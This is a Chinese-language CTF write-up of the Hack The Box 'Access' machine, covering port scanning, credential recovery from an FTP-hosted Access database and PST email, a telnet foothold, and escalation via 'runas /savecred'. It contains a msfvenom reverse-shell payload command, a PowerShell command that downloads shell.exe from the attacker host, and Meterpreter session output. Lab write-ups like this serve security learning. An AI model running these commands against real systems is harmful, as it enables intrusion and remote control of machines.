# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测
```
┌──(root💀kali)-[~/htb/Access]
└─# nmap -p- 10.10.10.98 --open -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-26 00:42 EST
Stats: 0:10:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.10.98
Host is up (0.30s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 906.88 seconds
                                                                                                                    
┌──(root💀kali)-[~/htb/Access]
└─# nmap -sV -Pn 10.10.10.98 -p 21,23,80                                  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-26 00:58 EST
Nmap scan report for 10.10.10.98
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.88 seconds

```

## ftp

ftp可以匿名登录，但是我用kali连接下载里面的backup.mdb文件总是会中断
```
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
  0% |                                                                       |  1285        1.25 KiB/s  1:13:20 ETAftp: Reading from network: 被中断的系统调用
  0% |                                                                       |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
ftp> 

```

后来我vpn切换到windows，用XFTP完整下载到了这个文件

```
┌──(root💀kali)-[~/htb/Access]
└─# ll
总用量 5532
-rw-r--r-- 1 root root   10870  8月 23  2018 'Access Control.zip'
-rwxrw-rw- 1 root root 5652480  1月 26 02:05  backup.mdb

```

backup.mdb是微软的access数据库文件，需要用微软的办公套件打开，刚好我另一台windows虚拟机安装了，找到auth_user表，找到3组用户凭据
```
admin：admin
engineer：access4u@security
backup_admin：admin
```

```access4u@security```是另一个zip文件的密码，解开得到一个pst文件，pst需要使用outlook打开,但是我用outlook好像找不到邮件，后来我用[这个](https://outlook.recoverytoolbox.com/ch/pst-viewer.html)软件打开

打开以后得到一封邮件：
```
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,
John

```
得到一组用户凭据
```security:4Cc3ssC0ntr0ller```

使用telnet服务，拿到foothold
```
┌──(root💀kali)-[~/htb/Access]
└─# telnet 10.10.10.98 23
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\security>
```

# 提权

什么是runas命令？
runas就是windows上的特权命令，类似于linux下的sudo。

查看runas用法
```
C:\Users\max>runas
RUNAS 用法:

RUNAS [ [/noprofile | /profile] [/env] [/savecred | /netonly] ]
        /user:<UserName> program

RUNAS [ [/noprofile | /profile] [/env] [/savecred] ]
        /smartcard [/user:<UserName>] program

RUNAS /trustlevel:<TrustLevel> program

   /noprofile        指定不应该加载用户的配置文件。
                     这会加速应用程序加载，但
                     可能会造成一些应用程序运行不正常。
   /profile          指定应该加载用户的配置文件。
                     这是默认值。
   /env              要使用当前环境，而不是用户的环境。
   /netonly          只在指定的凭据限于远程访问的情况下才使用。
   /savecred         用用户以前保存的凭据。
   /smartcard        如果凭据是智能卡提供的，则使用这个选项。
   /user             <UserName> 应使用 USER@DOMAIN 或 DOMAIN\USER 形式
   /showtrustlevels  显示可以用作 /trustlevel 的参数的
                     信任级别。
   /trustlevel       <Level> 应该是在 /showtrustlevels 中枚举
                     的一个级别。
   program           EXE 的命令行。请参阅下面的例子

示例:
> runas /noprofile /user:mymachine\administrator cmd
> runas /profile /env /user:mydomain\admin "mmc %windir%\system32\dsa.msc"
> runas /env /user:user@domain.microsoft.com "notepad \"my file.txt\""

注意:  只在得到提示时才输入用户的密码。
注意:  /profile 跟 /netonly 不兼容。
注意:  /savecred 跟 /smartcard 不兼容。
```

留意参数```  /savecred         用用户以前保存的凭据。```

在靶机上用cmdkey命令查看用户凭据，可以看到保存了Administrator的命令
```
C:\Users\security\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    
    Target: Domain:interactive=WORKGROUP\administrator
                                                          Type: Domain Password
    User: WORKGROUP\administrator
    

```
思路就是使用runas以administrator的权限运行一个反弹shell，从而实现提权。

编译一个反弹shell
```
┌──(root💀kali)-[~/htb/Access]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

传到靶机
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/shell.exe','C:\Users\security\Desktop\shell.exe')"
```

执行命令：

```runas /savecred /user:ACCESS\Administrator C:\Users\security\Desktop\shell.exe ```


收到靶机返回的shell，已经是管理员权限
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Sending stage (175174 bytes) to 10.10.10.98
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.98:49160 ) at 2022-01-26 04:10:18 -0500

meterpreter > getuid
Server username: ACCESS\Administrator

```